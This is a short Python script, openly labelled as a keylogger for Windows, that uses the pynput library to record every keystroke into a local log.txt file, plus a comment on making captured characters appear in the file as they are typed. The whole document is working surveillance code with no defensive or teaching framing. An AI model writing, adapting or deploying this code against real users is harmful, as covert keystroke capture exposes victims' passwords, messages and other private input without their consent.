###################################
# Keylogger to be used in Windows #
###################################
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

# Probably best to simply removing logging all together and replace logging.info with
# file write statements (after open()). I would recommend opening the file in append
# mode on each write so you can see characters in the file while they are being picked up.
logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(message)s')

def on_press(key):
    if(str(key) == "Key.enter" or str(key) == "Key.tab"):
        logging.info(str(key) + '\n')
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
